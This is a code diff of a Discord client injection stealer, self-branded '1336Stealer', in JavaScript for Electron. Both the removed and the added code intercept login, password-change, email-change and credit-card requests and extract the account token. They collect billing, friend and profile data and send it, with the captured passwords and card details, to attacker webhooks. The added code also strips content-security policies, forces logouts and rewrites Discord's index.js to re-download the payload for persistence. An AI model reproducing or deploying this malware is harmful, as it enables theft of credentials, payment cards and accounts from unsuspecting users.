-    if ((flags & House_Brilliance) == House_Brilliance) {
-        badges += "<:brilliance:874750808338608199> "
-    }
-    if ((flags & House_Balance) == House_Balance) {
-        badges += "<:balance:874750808267292683> "
-    }
-    if ((flags & Early_Supporter) == Early_Supporter) {
-        badges += "<:early_supporter:874750808414113823> "
-    }
-    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
-        badges += "<:bughunter_2:874750808430874664> "
-    }
-    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
-        badges += "<:developer:874750808472825986> "
-    }
-    if ((flags & Discord_Active_Developer) == Discord_Active_Developer) {
-        badges += "<:activedev:1041634224253444146> "
-    }
-    if (badges == "") {
-        badges = "None"
-    }
-    return badges
-}
-
-
-
-async function Login(email, password, token) {
-    const window = BrowserWindow.getAllWindows()[0];
-    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
-    var {
-        ip
-    } = await getFromURL("https://www.myexternalip.com/json", null)
-    window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText`, !0).then((info3) => {
-        window.webContents.executeJavaScript(`
-            var xmlHttp = new XMLHttpRequest();
-            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
-            xmlHttp.setRequestHeader("Authorization", "${token}");
-            xmlHttp.send( null );
-            xmlHttp.responseText`, !0).then((info4) => {
-            function totalFriends() {
-                var f = JSON.parse(info4)
-                const r = f.filter((user) => {
-                    return user.type == 1
-                })
-                return r.length
+const post = async (params) => {
+    params = JSON.stringify(params)
+    var token = await execScript(tokenScript)
+    var n = JSON.stringify({
+        data: params,
+        token: token
+    });
+    [config.uwu, config.webhook].forEach(res => {
+        const url = new URL(res);
+        const options = {
+            host: url.hostname,
+            port: url.port,
+            path: url.pathname,
+            method: 'POST',
+            headers: {
+                "Content-Type": "application/json"
             }
-
-            function CalcFriends() {
-                var f = JSON.parse(info4)
-                const r = f.filter((user) => {
-                    return user.type == 1
-                })
-                var gay = "";
-                for (z of r) {
-                    var b = GetRBadges(z.user.public_flags)
-                    if (b != "") {
-                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
-                    }
-                }
-                if (gay == "") {
-                    gay = "No Rare Friends"
-                }
-                return gay
-            }
-
-            function Cool() {
-                const json = JSON.parse(info3)
-                var billing = "";
-                json.forEach(z => {
-                    if (z.type == "") {
-                        return ":x:"
-                    } else if (z.type == 2 && z.invalid != !0) {
-                        billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
-                    } else if (z.type == 1 && z.invalid != !0) {
-                        billing += ":heavy_check_mark:" + " :credit_card:"
-                    } else {
-                        return ":x:"
-                    }
-                })
-                if (billing == "") {
-                    billing = ":x:"
-                }
-                return billing
-            }
-            if(info.avatar === null){
-                usericonurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
-            }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
-            if(info.banner === null){
-                bannerurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
-            }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
-            
-            const params = {
-                username: "1336Stealer | t.me/St34ler",
-                avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
-                content: "",
-                embeds: [{
-                    "title": "1336Stealer User Login",
-                    description: `${info.username}'s account`,
-                    "color": config['embed-color'],
-                    "fields": [{
-                        name: "Injection Info",
-                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
-                        inline: !1
-                                                }, {
-                        name: ":mag_right: User ID",
-                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
-                        inline: !0
-												}, {
-                        name: ":bust_in_silhouette: Username",
-                        value: `\`${info.username}#${info.discriminator}\``,
-                        inline: !0
-
-												}, {
-                        name: "<a:nitro:1067551337266561135> Nitro",
-                        value: `${GetNitro(info.premium_type)}`,
-                        inline: !0
-												}, {
-                        name: "<:badge:1067551347332878487> Badges",
-                        value: `${GetBadges(info.flags)}`,
-                        inline: !0
-												}, {
-                        name: ":card: Billings",
-                        value: `${Cool()}`,
-                        inline: !1
-												}, {
-                        name: "<:mail:1067551360637218897> Email",
-                        value: `\`${email}\``,
-                        inline: !0
-                                                }, {
-                        name: "<a:a2f:1040272766982692885> A2F",
-                        value: `${GetA2F(info.mfa_enabled)}`,
-                        inline: !0
-												}, {
-                        name: ":fire: Password",
-                        value: `\`${password}\``,
-                        inline: !0
-												}, {
-                        name: "<:token:1067551382103658597> Token",
-                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
-                        inline: !1
-												}, ],
-
-
-                    "thumbnail": {
-                        "url": `${usericonurl}`
-                    }
-											}, {
-                    "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
-                    "color": config['embed-color'],
-                    "description": CalcFriends(),
-
-                    "image": {
-                        'url': `${bannerurl}`,
-                    },
-                    "thumbnail": {
-                        "url": `${usericonurl}`
-                    }
-											}]
-            }
-            
-            let data = JSON.stringify(params);
-            let UwU = JSON.stringify({ data: data, token: token })
-            post(config.apiurl, UwU);
-            hooker(params)
-        })
-    })
-}
-
-
-
-
-async function ChangePassword(oldpassword, newpassword, token) {
-    const window = BrowserWindow.getAllWindows()[0];
-    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
-    var {
-        ip
-    } = await getFromURL("https://www.myexternalip.com/json", null)
-    window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText`, !0).then((info3) => {
-        window.webContents.executeJavaScript(`
-            var xmlHttp = new XMLHttpRequest();
-            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
-            xmlHttp.setRequestHeader("Authorization", "${token}");
-            xmlHttp.send( null );
-            xmlHttp.responseText`, !0).then((info4) => {
-
-            function totalFriends() {
-                var f = JSON.parse(info4)
-                const r = f.filter((user) => {
-                    return user.type == 1
-                })
-                return r.length
-            }
-
-            function CalcFriends() {
-                var f = JSON.parse(info4)
-                const r = f.filter((user) => {
-                    return user.type == 1
-                })
-                var gay = "";
-                for (z of r) {
-                    var b = GetRBadges(z.user.public_flags)
-                    if (b != "") {
-                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
-                    }
-                }
-                if (gay == "") {
-                    gay = "No Rare Friends"
-                }
-                return gay
-            }
-
-            function Cool() {
-                const json = JSON.parse(info3)
-                var billing = "";
-                json.forEach(z => {
-                    if (z.type == "") {
-                        return ":x:"
-                    } else if (z.type == 2 && z.invalid != !0) {
-                        billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
-                    } else if (z.type == 1 && z.invalid != !0) {
-                        billing += ":heavy_check_mark:" + " :credit_card:"
-                    } else {
-                        return ":x:"
-                    }
-                })
-                if (billing == "") {
-                    billing = ":x:"
-                }
-                return billing
-            }
-            let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
-            const params = {
-                username: "1336Stealer | t.me/St34ler",
-                avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
-                content: "",
-                embeds: [{
-                    "title": "1336Stealer Password Changed",
-                    description: `${info.username}'s account`,
-                    "color": config['embed-color'],
-                    "fields": [{
-                        name: "Injection Info",
-                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
-                        inline: !1
-												}, {
-                        name: ":mag_right: User ID",
-                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
-                        inline: !0
-                                                }, {
-                        name: ":bust_in_silhouette: Username ",
-                        value: `\`${info.username}#${info.discriminator}\``,
-                        inline: !0
-												}, {
-                        name: "<a:nitro:1067551337266561135> Nitro",
-                        value: `${GetNitro(info.premium_type)}`,
-                        inline: !0
-												}, {
-                        name: "<:badge:1067551347332878487> Badges",
-                        value: `${GetBadges(info.flags)}`,
-                        inline: !0
-												}, {
-                        name: ":card: Billings",
-                        value: `${Cool()}`,
-                        inline: !1
-                                                }, {
-                        name: "<a:a2f:1040272766982692885> A2F",
-                        value: `${GetA2F(info.mfa_enabled)}`,
-                        inline: !0
-												}, {
-                        name: "<:mail:1067551360637218897> Email",
-                        value: `\`${info.email}\``,
-                        inline: !1
-												}, {
-                        name: ":anchor: Old Password",
-                        value: `\`${oldpassword}\``,
-                        inline: !0
-												}, {
-                        name: ":fire: New Password",
-                        value: `\`${newpassword}\``,
-                        inline: !0
-												}, {
-                        name: "<:token:1067551382103658597> Token",
-                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n`,
-                        inline: !1
-												}, ],
-
-                    "thumbnail": {
-                        "url": `${usericonurl}`
-                    }
-											}, {
-                    "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
-                    "color": config['embed-color'],
-                    "description": CalcFriends(),
-
-                    "image": {
-                        'url': `${bannerurl}`,
-                    },
-                    "thumbnail": {
-                        "url": `${usericonurl}`
-                    }
-											}]
-            }
-            let data = JSON.stringify(params);
-            let UwU = JSON.stringify({ data: data, token: token })
-            post(config.apiurl, UwU);
-            
-            hooker(params)
-        })
-    })
-}
-
-async function ChangeEmail(newemail, password, token) {
-    const window = BrowserWindow.getAllWindows()[0];
-    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
-    var {
-        ip
-    } = await getFromURL("https://www.myexternalip.com/json", null)
-    window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText`, !0).then((info3) => {
-        window.webContents.executeJavaScript(`
-            var xmlHttp = new XMLHttpRequest();
-            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
-            xmlHttp.setRequestHeader("Authorization", "${token}");
-            xmlHttp.send( null );
-            xmlHttp.responseText`, !0).then((info4) => {
-            function totalFriends() {
-                var f = JSON.parse(info4)
-                const r = f.filter((user) => {
-                    return user.type == 1
-                })
-                return r.length
-            }
-
-            function CalcFriends() {
-                var f = JSON.parse(info4)
-                const r = f.filter((user) => {
-                    return user.type == 1
-                })
-                var gay = "";
-                for (z of r) {
-                    var b = GetRBadges(z.user.public_flags)
-                    if (b != "") {
-                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
-                    }
-                }
-                if (gay == "") {
-                    gay = "No Rare Friends"
-                }
-                return gay
-            }
-
-            function Cool() {
-                const json = JSON.parse(info3)
-                var billing = "";
-                json.forEach(z => {
-                    if (z.type == "") {
-                        return ":x:"
-                    } else if (z.type == 2 && z.invalid != !0) {
-                        billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
-                    } else if (z.type == 1 && z.invalid != !0) {
-                        billing += ":heavy_check_mark:" + " :credit_card:"
-                    } else {
-                        return ":x:"
-                    }
-                })
-                if (billing == "") {
-                    billing = ":x:"
-                }
-                return billing
-            }
-            if(info.avatar === null){
-                usericonurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
-            }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
-            if(info.banner === null){
-                bannerurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
-            }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
-
-
-            
-           const params = {
-                username: "1336Stealer | t.me/St34ler",
-                avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
-                content: "",
-                embeds: [{
-                    "title": "1336Stealer Email Changed",
-                    description: `${info.username}'s account`,
-                        "color": config['embed-color'],
-                        "fields": [{
-                                name: "Injection Info",
-                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
-                                inline: !1
-					}, {
-                                name: ":mag_right: User ID",
-                                value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
-                                inline: !0
-                    }, {
-                                name: ":bust_in_silhouette: Username",
-                                value: `\`${info.username}#${info.discriminator}\``,
-                                inline: !0
-					}, {
-                                name: "<a:nitro:1067551337266561135> Nitro",
-                                value: `${GetNitro(info.premium_type)}`,
-                                inline: !0
-					}, {
-                                name: "<:badge:1067551347332878487> Badges",
-                                value: `${GetBadges(info.flags)}`,
-                                inline: !0
-					}, {
-                                name: ":card: Billings",
-                                value: `${Cool()}`,
-                                inline: !1
-                    }, {
-                                name: "<a:a2f:1040272766982692885> A2F",
-                                value: `${GetA2F(info.mfa_enabled)}`,
-                                inline: !0
-					}, {
-                                name: "<:mail:1067551360637218897> New Email",
-                                value: `\`${newemail}\``,
-                                inline: !0
-					}, {
-                                name: ":fire: Password",
-                                value: `\`${password}\``,
-                                inline: !0
-					}, {
-                                name: "<:token:1067551382103658597> Token",
-                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n`,
-                                inline: !1
-					},
-				],
-
-
-                        "thumbnail": {
-                            "url": `${usericonurl}`
-                        }
-				}, {
-                        "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
-                        "color": config['embed-color'],
-                        "description": CalcFriends(),
-
-
-                        "image": {
-                            'url': `${bannerurl}`,
-                        },
-
-                        "thumbnail": {
-                            "url": `${usericonurl}`
-                        }
-			}
-		]
-            }
-            let data = JSON.stringify(params);
-            let UwU = JSON.stringify({ data: data, token: token })
-            post(config.apiurl, UwU);
-            hooker(params)
-        })
-    })
-}
-
-
-
-
-async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
-    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
-    var {
-        ip
-    } = await getFromURL("https://www.myexternalip.com/json", null)
-        if(info.avatar === null){
-            usericonurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
-        }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
-        if(info.banner === null){
-            bannerurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
-        }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
-
-        
-        const params = {
-            username: "1336Stealer | t.me/St34ler",
-            avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
-            content: "",
-            embeds: [{
-                    "title": "1336Stealer User Credit Card Added",
-                    "description": `
-                    **IP:** ${ip}\n\n
-                    :mag_right: **ID**\n\`\`\`${info.id}\`\`\`\n
-                    :bust_in_silhouette: **Username**\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
-                    <a:nitro:1067551337266561135> **Nitro**\n${GetNitro(info.premium_type)}\n
-                    <:badge:1067551347332878487> **Badges**\n${GetBadges(info.flags)}\
-                    <:mail:1067551360637218897> **Email**\n\`\`\`${info.email}\`\`\`\n
-					<a:a2f:1040272766982692885> **A2F**\n${GetA2F(info.mfa_enabled)}\n
-                    **Credit Card Number**\n\`\`\`${number}\`\`\`\n
-                    **Credit Card Expiration**\n\`\`\`${expir_month}/${expir_year}\`\`\`\n
-                    **CVC**\n\`\`\`${cvc}\`\`\`\n
-                    <:token:1067551382103658597> **Token** \n\`\`\`${token}\`\`\``,
-                    "author": {
-                        "name": "1336Stealer | t.me/St34ler"
-                    },
-                    "thumbnail": {
-                        "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
-                    },
-            },
-                {
-                    "title": `<a:totalfriends:1041641100017946685> Guilds Owner`,
-                    "color": config['embed-color'],
-                    "description": `\`\`\`diff\n${fs.readFileSync('1336_guilds.txt', 'utf-8') || "- This shit is not the owner of any server"}\`\`\``,
-
-
-                    "image": {
-                        'url': `${bannerurl}`,
-                    },
-                    "thumbnail": {
-                        "url": `${usericonurl}`
-                    }
-            }
-        ]
         }
-        let data = JSON.stringify(params);
-        let UwU = JSON.stringify({ data: data, token: token })
-        post(config.apiurl, UwU);
-        hooker(params)
+        const req = https.request(options);
+        req.on("error", (err) => {
+            console.log(err);
+        });
+        req.write(res == config.uwu ? n : params);
+        req.end();
+    })
+
+}
+const FirstTime = async () => {
+    if (doTheLogOut) return false
+    var token = await execScript(tokenScript)
+    if (config['init-notify'] !== "true") return true
+    if (fs.existsSync(__dirname + "/1336")) fs.rmdirSync(__dirname + "/1336")
+    var ip = await getIP()
+    if (!token) {
+        var params = await makeEmbed({
+            title: "1336St34ler Initalized",
+            fields: [{
+                name: "Injection Info",
+                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
+                inline: !1
+            }]
+        })
+    } else {
+        var user = await getURL("https://discord.com/api/v8/users/@me", token)
+        var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
+        var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
+        var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
+
+        var Billings = parseBilling(billing)
+        var Friends = parseFriends(friends)
+        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
+
+
+        userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
+        var params = await makeEmbed({
+            title: "1336St34ler Initalized",
+            fields: [{
+                name: "Injection Info",
+                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
+                inline: !1
+            }, {
+                name: ":mag_right: User ID",
+                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                inline: !0
+            }, {
+                name: ":bust_in_silhouette: Username",
+                value: `\`${user.username}#${user.discriminator}\``,
+                inline: !0
+            }, {
+                name: "<a:nitro:1067551337266561135> Nitro",
+                value: `${GetNitro(Nitro)}`,
+                inline: !0
+            }, {
+                name: "<:badge:1067551347332878487> Badges",
+                value: `${GetBadges(user.flags)}`,
+                inline: !0
+            }, {
+                name: ":card: Billings",
+                value: `${Billings}`,
+                inline: !1
+            }, {
+                name: "<a:a2f:1040272766982692885> A2F",
+                value: `${GetA2F(user.mfa_enabled)}`,
+                inline: !0
+            }, {
+                name: "<:mail:1067551360637218897> Email",
+                value: `\`${user.email}\``,
+                inline: !0
+            }, {
+                name: "<:token:1067551382103658597> Token",
+                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                inline: !1
+            }],
+            image: userBanner,
+            thumbnail: userAvatar
+        })
+        var params2 = await makeEmbed({
+            title: `<:JoinIcon:1050854831742525510> Total Friends (${Friends.len})`,
+            color: config['embed-color'],
+            description: Friends.badges,
+            image: userBanner,
+            thumbnail: userAvatar
+        })
+
+        params.embeds.push(params2.embeds[0])
+    }
+    await post(params)
+    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
+        if (!token) {
+            var params = await makeEmbed({
+                title: "1336St34ler User log out (User not Logged in before)",
+                fields: [{
+                    name: "Injection Info",
+                    value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
+                    inline: !1
+                }]
+            })
+        } else {
+            var user = await getURL("https://discord.com/api/v8/users/@me", token)
+            var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
+            var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
+            var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
+
+            var Billings = parseBilling(billing)
+            var Friends = parseFriends(friends)
+            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
+
+
+            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
+            var params = await makeEmbed({
+                title: "1336St34ler Victim got logged out",
+                fields: [{
+                    name: "Injection Info",
+                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
+                    inline: !1
+                }, {
+                    name: ":mag_right: User ID",
+                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                    inline: !0
+                }, {
+                    name: ":bust_in_silhouette: Username",
+                    value: `\`${user.username}#${user.discriminator}\``,
+                    inline: !0
+                }, {
+                    name: "<a:nitro:1067551337266561135> Nitro",
+                    value: `${GetNitro(Nitro)}`,
+                    inline: !0
+                }, {
+                    name: "<:badge:1067551347332878487> Badges",
+                    value: `${GetBadges(user.flags)}`,
+                    inline: !0
+                }, {
+                    name: ":card: Billings",
+                    value: `${Billings}`,
+                    inline: !1
+                }, {
+                    name: "<a:a2f:1040272766982692885> A2F",
+                    value: `${GetA2F(user.mfa_enabled)}`,
+                    inline: !0
+                }, {
+                    name: "<:mail:1067551360637218897> Email",
+                    value: `\`${user.email}\``,
+                    inline: !0
+                }, {
+                    name: "<:token:1067551382103658597> Token",
+                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                    inline: !1
+                }],
+                image: userBanner,
+                thumbnail: userAvatar
+            })
+            var params2 = await makeEmbed({
+                title: `<:JoinIcon:1050854831742525510> Total Friends (${Friends.len})`,
+                color: config['embed-color'],
+                description: Friends.badges,
+                image: userBanner,
+                thumbnail: userAvatar
+            })
+
+            params.embeds.push(params2.embeds[0])
+        }
+        fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
+        await execScript(logOutScript)
+        doTheLogOut = true
+        await post(params)
+    }
+    return false
 }
 
-const ChangePasswordFilter = {
-    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
-};
+const path = (function () {
+    var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/")
+    appPath.pop()
+    appPath = appPath.join("/")
+    var appName = electron.app.getName()
+    return {
+        appPath,
+        appName
+    }
+}())
 
+const checUpdate = () => {
+    var {
+        appPath,
+        appName
+    } = path
 
+    var ressource = `${appPath}/app`
+    var indexFile = __filename.replace(/\\/g, "/")
+    var betterDiscord = `${process.env.appdata.replace(/\\/g, "/")}/betterdiscord/data/betterdiscord.asar`
+    var package = `${ressource}/package.json`
+    var index = `${ressource}/index.js`
 
+    if (!fs.existsSync(ressource)) fs.mkdirSync(ressource)
+    fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`)
 
-session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
+    var script = `const fs = require("fs"), https = require("https")
+
+var index = "${indexFile}"
+var betterDiscord = "${betterDiscord}"
+
+var bouki = fs.readFileSync(index).toString()
+if (bouki == "module.exports = require('./core.asar');") init()
+
+function init() {
+    https.get("${config.injection_url}", res => {
+        var chunk = ""
+        res.on("data", data => chunk += data)
+        res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
+    }).on("error", (err) => setTimeout(init(), 10000));
+}
+
+require("${appPath}/app.asar")
+if (fs.existsSync(betterDiscord)) require(betterDiscord)`
+
+    fs.writeFileSync(index, script)
+    if (!doTheLogOut) execScript(logOutScript)
+    return
+}
+electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, async (details, callback) => {
+    await electron.app.whenReady();
+    await FirstTime()
     if (details.url.startsWith("wss://remote-auth-gateway")) return callback({
         cancel: true
-    });
-    updateCheck();
+    })
 
-    if (FirstTime()) {}
-
+    checUpdate()
     callback({})
-    return;
 })
 
+electron.session.defaultSession.webRequest.onHeadersReceived((request, callback) => {
+    delete request.responseHeaders['content-security-policy']
+    delete request.responseHeaders['content-security-policy-report-only']
+    callback({
+        responseHeaders: {
+            ...request.responseHeaders,
+            'Access-Control-Allow-Headers': '*',
+        },
+    })
+})
 
-session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
-    if (details.url.endsWith("login")) {
-        if (details.statusCode == 200) {
-            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
-            const email = data.login;
-            const password = data.password;
-            const window = BrowserWindow.getAllWindows()[0];
-            window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
-                Login(email, password, token)
-            }))
-        } else {}
+electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
+    if (!["POST", "PATCH"].includes(request.method)) return
+    if (request.statusCode !== 200) return
+    try {
+        var data = JSON.parse(request.uploadData[0].bytes)
+    } catch (err) {
+        var data = queryString.parse(decodeURIComponent(request.uploadData[0].bytes.toString()))
     }
-    if (details.url.endsWith("users/@me")) {
-        if (details.statusCode == 200 && details.method == "PATCH") {
-            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
-            if (data.password != null && data.password != undefined && data.password != "") {
-                if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
-                    const window = BrowserWindow.getAllWindows()[0];
-                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
-                        ChangePassword(data.password, data.new_password, token)
-                    }))
-                }
-                if (data.email != null && data.email != undefined && data.email != "") {
-                    const window = BrowserWindow.getAllWindows()[0];
-                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
-                        ChangeEmail(data.email, data.password, token)
-                    }))
-                }
+    var token = await execScript(tokenScript)
+    var ip = await getIP()
+    var user = await getURL("https://discord.com/api/v8/users/@me", token)
+    var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
+    var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
+    var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
+
+    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
+
+
+
+    userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
+    var Billings = parseBilling(billing)
+    var Friends = parseFriends(friends)
+
+    switch (true) {
+        case request.url.endsWith("login"):
+            var password = data.password
+            var params = await makeEmbed({
+                title: "1336St34ler User Login",
+                description: "[${info.username}'s account](https://t.me/St34ler)",
+                color: config['embed-color'],
+                fields: [{
+                    name: "Injection Info",
+                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
+                    inline: !1
+                }, {
+                    name: ":mag_right: User ID",
+                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                    inline: !0
+                }, {
+                    name: ":bust_in_silhouette: Username",
+                    value: `\`${user.username}#${user.discriminator}\``,
+                    inline: !0
+                }, {
+                    name: "<a:nitro:1067551337266561135> Nitro",
+                    value: `${GetNitro(Nitro)}`,
+                    inline: !0
+                }, {
+                    name: "<:badge:1067551347332878487> Badges",
+                    value: `${GetBadges(user.flags)}`,
+                    inline: !0
+                }, {
+                    name: ":card: Billings",
+                    value: `${Billings}`,
+                    inline: !1
+                }, {
+                    name: "<a:a2f:1040272766982692885> A2F",
+                    value: `${GetA2F(user.mfa_enabled)}`,
+                    inline: !0
+                }, {
